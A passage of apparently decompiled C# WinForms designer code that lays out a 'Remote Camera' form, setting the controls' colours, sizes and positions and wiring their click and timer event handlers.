        this.ListDrive.ItemHeight = 20;
        this.ListDrive.ItemHighLightColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ListDrive.ItemHighLightForeColor = System.Drawing.Color.White;
        this.ListDrive.ItemTopMargin = 3;
        this.ListDrive.Location = new System.Drawing.Point(8, 36);
        this.ListDrive.Name = "ListDrive";
        this.ListDrive.Size = new System.Drawing.Size(236, 26);
        this.ListDrive.TabIndex = 644;
        this.ListDrive.Text = null;
        this.ListDrive.TextAlignment = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
        this.ListDrive.TextLeftMargin = 5;
        this.MuneClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.MuneClose.AutoSize = true;
        this.MuneClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.MuneClose.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.MuneClose.Location = new System.Drawing.Point(233, 0);
        this.MuneClose.Name = "MuneClose";
        this.MuneClose.Size = new System.Drawing.Size(16, 15);
        this.MuneClose.TabIndex = 598;
        this.MuneClose.Text = "X";
        this.MuneClose.Click += new System.EventHandler(MuneClose_Click);
        this.ValueQuality.BackColor = System.Drawing.Color.White;
        this.ValueQuality.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ValueQuality.ForeColor = System.Drawing.Color.DimGray;
        this.ValueQuality.Location = new System.Drawing.Point(172, 80);
        this.ValueQuality.Name = "ValueQuality";
        this.ValueQuality.Size = new System.Drawing.Size(66, 17);
        this.ValueQuality.TabIndex = 640;
        this.ValueQuality.Text = "60% Quality";
        this.QualityTrackBar.BackColor = System.Drawing.Color.White;
        this.QualityTrackBar.FillColor = System.Drawing.Color.FromArgb(193, 200, 207);
        this.QualityTrackBar.HoverState.Parent = this.QualityTrackBar;
        this.QualityTrackBar.Location = new System.Drawing.Point(8, 79);
        this.QualityTrackBar.Name = "QualityTrackBar";
        this.QualityTrackBar.Size = new System.Drawing.Size(158, 23);
        this.QualityTrackBar.TabIndex = 630;
        this.QualityTrackBar.ThumbColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.QualityTrackBar.Value = 60;
        this.QualityTrackBar.Scroll += new System.Windows.Forms.ScrollEventHandler(QualityTrackBar_Scroll);
        this.bunifuLabel17.AllowParentOverrides = false;
        this.bunifuLabel17.AutoEllipsis = false;
        this.bunifuLabel17.AutoSize = false;
        this.bunifuLabel17.BackColor = System.Drawing.Color.White;
        this.bunifuLabel17.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel17.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel17.Dock = System.Windows.Forms.DockStyle.Top;
        this.bunifuLabel17.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.bunifuLabel17.ForeColor = System.Drawing.Color.Gray;
        this.bunifuLabel17.Location = new System.Drawing.Point(0, 0);
        this.bunifuLabel17.Name = "bunifuLabel17";
        this.bunifuLabel17.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel17.Size = new System.Drawing.Size(254, 15);
        this.bunifuLabel17.TabIndex = 615;
        this.bunifuLabel17.Text = "Control Panel";
        this.bunifuLabel17.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
        this.bunifuLabel17.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.Power.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.Power.Animated = true;
        this.Power.BackColor = System.Drawing.Color.White;
        this.Power.BorderRadius = 4;
        this.Power.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Power.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Power.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Power.CheckedState.Parent = this.Power;
        this.Power.Cursor = System.Windows.Forms.Cursors.Hand;
        this.Power.CustomImages.Parent = this.Power;
        this.Power.Enabled = false;
        this.Power.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Power.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Power.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.Power.ForeColor = System.Drawing.Color.White;
        this.Power.HoverState.Parent = this.Power;
        this.Power.Location = new System.Drawing.Point(167, 311);
        this.Power.Name = "Power";
        this.Power.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.Power.PressedDepth = 50;
        this.Power.ShadowDecoration.Parent = this.Power;
        this.Power.Size = new System.Drawing.Size(76, 29);
        this.Power.TabIndex = 574;
        this.Power.Text = "Start";
        this.Power.Click += new System.EventHandler(Power_Click);
        this.ViewerBox.BackColor = System.Drawing.Color.Black;
        this.ViewerBox.Dock = System.Windows.Forms.DockStyle.Fill;
        this.ViewerBox.Location = new System.Drawing.Point(0, 0);
        this.ViewerBox.Name = "ViewerBox";
        this.ViewerBox.Size = new System.Drawing.Size(562, 348);
        this.ViewerBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
        this.ViewerBox.TabIndex = 577;
        this.ViewerBox.TabStop = false;
        this.FormResizeBox1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.FormResizeBox1.ForeColor = System.Drawing.Color.Empty;
        this.FormResizeBox1.Location = new System.Drawing.Point(565, 463);
        this.FormResizeBox1.Name = "FormResizeBox1";
        this.FormResizeBox1.Size = new System.Drawing.Size(20, 20);
        this.FormResizeBox1.TabIndex = 600;
        this.FormResizeBox1.TargetControl = this;
        this.PanelTitle.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTitle.BackgroundColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTitle.BackgroundImage");
        this.PanelTitle.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTitle.BorderColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BorderRadius = 22;
        this.PanelTitle.BorderThickness = 1;
        this.PanelTitle.Controls.Add(this.LoaderConnect);
        this.PanelTitle.Controls.Add(this.ButtonMune);
        this.PanelTitle.Controls.Add(this.ButtClose);
        this.PanelTitle.Controls.Add(this.ButtionMinimized);
        this.PanelTitle.Controls.Add(this.ButtonMaximized);
        this.PanelTitle.Controls.Add(this.UserIdInfo);
        this.PanelTitle.Controls.Add(this.bunifuLabel1);
        this.PanelTitle.Controls.Add(this.LogoImage);
        this.PanelTitle.Cursor = System.Windows.Forms.Cursors.SizeAll;
        this.PanelTitle.Location = new System.Drawing.Point(16, 22);
        this.PanelTitle.Name = "PanelTitle";
        this.PanelTitle.ShowBorders = true;
        this.PanelTitle.Size = new System.Drawing.Size(562, 77);
        this.PanelTitle.TabIndex = 596;
        this.LoaderConnect.AllowStylePresets = true;
        this.LoaderConnect.BackColor = System.Drawing.Color.Transparent;
        this.LoaderConnect.CapStyle = Bunifu.UI.WinForms.BunifuLoader.CapStyles.Flat;
        this.LoaderConnect.Color = System.Drawing.Color.FromArgb(87, 59, 255);
        this.LoaderConnect.Colors = new Bunifu.UI.WinForms.Bloom[0];
        this.LoaderConnect.Cursor = System.Windows.Forms.Cursors.Arrow;
        this.LoaderConnect.Customization = "";
        this.LoaderConnect.DashWidth = 0.5f;
        this.LoaderConnect.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.LoaderConnect.Image = null;
        this.LoaderConnect.Location = new System.Drawing.Point(12, 13);
        this.LoaderConnect.Name = "LoaderConnect";
        this.LoaderConnect.NoRounding = false;
        this.LoaderConnect.Preset = Bunifu.UI.WinForms.BunifuLoader.StylePresets.Dashed;
        this.LoaderConnect.RingStyle = Bunifu.UI.WinForms.BunifuLoader.RingStyles.Dashed;
        this.LoaderConnect.ShowText = false;
        this.LoaderConnect.Size = new System.Drawing.Size(57, 50);
        this.LoaderConnect.Speed = 7;
        this.LoaderConnect.TabIndex = 607;
        this.LoaderConnect.Text = "bunifuLoader1";
        this.LoaderConnect.TextPadding = new System.Windows.Forms.Padding(0);
        this.LoaderConnect.Thickness = 6;
        this.LoaderConnect.Transparent = true;
        this.ButtonMune.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtonMune.Animated = true;
        this.ButtonMune.AutoRoundedCorners = true;
        this.ButtonMune.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtonMune.BorderRadius = 11;
        this.ButtonMune.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButtonMune.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButtonMune.CheckedState.FillColor = System.Drawing.Color.White;
        this.ButtonMune.CheckedState.FillColor2 = System.Drawing.Color.White;
        this.ButtonMune.CheckedState.ForeColor = System.Drawing.Color.White;
        this.ButtonMune.CheckedState.Parent = this.ButtonMune;
        this.ButtonMune.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtonMune.CustomImages.Parent = this.ButtonMune;
        this.ButtonMune.FillColor = System.Drawing.Color.White;
        this.ButtonMune.FillColor2 = System.Drawing.Color.White;
        this.ButtonMune.Font = new System.Drawing.Font("Consolas", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.ButtonMune.ForeColor = System.Drawing.SystemColors.InfoText;
        this.ButtonMune.HoverState.Parent = this.ButtonMune;
        this.ButtonMune.Image = Properties.Resources.iconleft;
        this.ButtonMune.ImageSize = new System.Drawing.Size(18, 18);
        this.ButtonMune.Location = new System.Drawing.Point(523, 42);
        this.ButtonMune.Name = "ButtonMune";
        this.ButtonMune.ShadowDecoration.Parent = this.ButtonMune;
        this.ButtonMune.Size = new System.Drawing.Size(24, 24);
        this.ButtonMune.TabIndex = 606;
        this.ButtonMune.Click += new System.EventHandler(ButtonMune_Click);
        this.ButtClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtClose.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtClose.CheckedState.Parent = this.ButtClose;
        this.ButtClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtClose.CustomImages.Parent = this.ButtClose;
        this.ButtClose.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtClose.ForeColor = System.Drawing.Color.White;
        this.ButtClose.HoverState.BorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.Parent = this.ButtClose;
        this.ButtClose.Location = new System.Drawing.Point(532, 13);
        this.ButtClose.Name = "ButtClose";
        this.ButtClose.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtClose.ShadowDecoration.Parent = this.ButtClose;
        this.ButtClose.Size = new System.Drawing.Size(17, 17);
        this.ButtClose.TabIndex = 573;
        this.ButtClose.Click += new System.EventHandler(ButtClose_Click);
        this.ButtionMinimized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtionMinimized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtionMinimized.CheckedState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtionMinimized.CustomImages.Parent = this.ButtionMinimized;
        this.ButtionMinimized.FillColor = System.Drawing.Color.FromArgb(97, 196, 83);
        this.ButtionMinimized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtionMinimized.ForeColor = System.Drawing.Color.White;
        this.ButtionMinimized.HoverState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Location = new System.Drawing.Point(484, 13);
        this.ButtionMinimized.Name = "ButtionMinimized";
        this.ButtionMinimized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtionMinimized.ShadowDecoration.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Size = new System.Drawing.Size(17, 17);
        this.ButtionMinimized.TabIndex = 575;
        this.ButtionMinimized.Click += new System.EventHandler(ButtionMinimized_Click);
        this.ButtonMaximized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtonMaximized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtonMaximized.CheckedState.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtonMaximized.CustomImages.Parent = this.ButtonMaximized;
        this.ButtonMaximized.FillColor = System.Drawing.Color.FromArgb(244, 190, 83);
        this.ButtonMaximized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtonMaximized.ForeColor = System.Drawing.Color.White;
        this.ButtonMaximized.HoverState.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Location = new System.Drawing.Point(508, 13);
        this.ButtonMaximized.Name = "ButtonMaximized";
        this.ButtonMaximized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtonMaximized.ShadowDecoration.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Size = new System.Drawing.Size(17, 17);
        this.ButtonMaximized.TabIndex = 574;
        this.ButtonMaximized.Click += new System.EventHandler(ButtonMaximized_Click);
        this.UserIdInfo.AllowParentOverrides = false;
        this.UserIdInfo.AutoEllipsis = false;
        this.UserIdInfo.Cursor = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.CursorType = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.UserIdInfo.ForeColor = System.Drawing.Color.DarkGray;
        this.UserIdInfo.Location = new System.Drawing.Point(75, 40);
        this.UserIdInfo.Name = "UserIdInfo";
        this.UserIdInfo.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.UserIdInfo.Size = new System.Drawing.Size(10, 15);
        this.UserIdInfo.TabIndex = 572;
        this.UserIdInfo.Text = "--";
        this.UserIdInfo.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.UserIdInfo.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.bunifuLabel1.AllowParentOverrides = false;
        this.bunifuLabel1.AutoEllipsis = false;
        this.bunifuLabel1.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.bunifuLabel1.ForeColor = System.Drawing.Color.Black;
        this.bunifuLabel1.Location = new System.Drawing.Point(75, 17);
        this.bunifuLabel1.Name = "bunifuLabel1";
        this.bunifuLabel1.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel1.Size = new System.Drawing.Size(97, 17);
        this.bunifuLabel1.TabIndex = 571;
        this.bunifuLabel1.Text = "Remote Camera";
        this.bunifuLabel1.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel1.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.LogoImage.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.LogoImage.Image = (System.Drawing.Image)resources.GetObject("LogoImage.Image");
        this.LogoImage.Location = new System.Drawing.Point(10, 13);
        this.LogoImage.Name = "LogoImage";
        this.LogoImage.Size = new System.Drawing.Size(59, 50);
        this.LogoImage.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.LogoImage.TabIndex = 570;
        this.LogoImage.TabStop = false;
        this.PanelBottom.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelBottom.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelBottom.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelBottom.BackgroundImage");
        this.PanelBottom.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelBottom.BorderColor = System.Drawing.Color.White;
        this.PanelBottom.BorderRadius = 30;
        this.PanelBottom.BorderThickness = 1;
        this.PanelBottom.Location = new System.Drawing.Point(170, 478);
        this.PanelBottom.Name = "PanelBottom";
        this.PanelBottom.ShowBorders = true;
        this.PanelBottom.Size = new System.Drawing.Size(259, 25);
        this.PanelBottom.TabIndex = 594;
        this.PanelLeft.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.PanelLeft.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelLeft.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelLeft.BackgroundImage");
        this.PanelLeft.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelLeft.BorderColor = System.Drawing.Color.White;
        this.PanelLeft.BorderRadius = 30;
        this.PanelLeft.BorderThickness = 1;
        this.PanelLeft.Location = new System.Drawing.Point(-16, 112);
        this.PanelLeft.Name = "PanelLeft";
        this.PanelLeft.ShowBorders = true;
        this.PanelLeft.Size = new System.Drawing.Size(25, 270);
        this.PanelLeft.TabIndex = 593;
        this.PanelTOP.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTOP.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelTOP.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTOP.BackgroundImage");
        this.PanelTOP.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTOP.BorderColor = System.Drawing.Color.White;
        this.PanelTOP.BorderRadius = 30;
        this.PanelTOP.BorderThickness = 1;
        this.PanelTOP.Location = new System.Drawing.Point(170, -14);
        this.PanelTOP.Name = "PanelTOP";
        this.PanelTOP.ShowBorders = true;
        this.PanelTOP.Size = new System.Drawing.Size(259, 25);
        this.PanelTOP.TabIndex = 592;
        this.PanelRight.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.PanelRight.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelRight.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelRight.BackgroundImage");
        this.PanelRight.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelRight.BorderColor = System.Drawing.Color.White;
        this.PanelRight.BorderRadius = 30;
        this.PanelRight.BorderThickness = 1;
        this.PanelRight.Location = new System.Drawing.Point(582, 108);
        this.PanelRight.Name = "PanelRight";
        this.PanelRight.ShowBorders = true;
        this.PanelRight.Size = new System.Drawing.Size(25, 270);
        this.PanelRight.TabIndex = 591;
        this.FormDragControl1.Fixed = true;
        this.FormDragControl1.Horizontal = true;
        this.FormDragControl1.TargetControl = this.PanelTitle;
        this.FormDragControl1.Vertical = true;
        this.Timer1.Interval = 2000;
        this.Timer1.Tick += new System.EventHandler(Timer1_Tick);
        this.TimerSave.Interval = 1500;
        this.TimerSave.Tick += new System.EventHandler(TimerSave_Tick);
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.Gainsboro;
        base.ClientSize = new System.Drawing.Size(616, 513);
        base.Controls.Add(this.panelForm);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Name = "Cam";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "Cam";
        base.TransparencyKey = System.Drawing.Color.Gainsboro;
        base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(Cam_FormClosing);
        base.Load += new System.EventHandler(Cam_Load);
        base.Shown += new System.EventHandler(Cam_Shown);
        this.panelForm.ResumeLayout(false);
        this.panel1.ResumeLayout(false);
        this.PanelMune.ResumeLayout(false);
        this.PanelMune.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox2).EndInit();
        ((System.ComponentModel.ISupportInitialize)this.ViewerBox).EndInit();
        this.PanelTitle.ResumeLayout(false);
        this.PanelTitle.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.LogoImage).EndInit();
        base.ResumeLayout(false);
    }
}
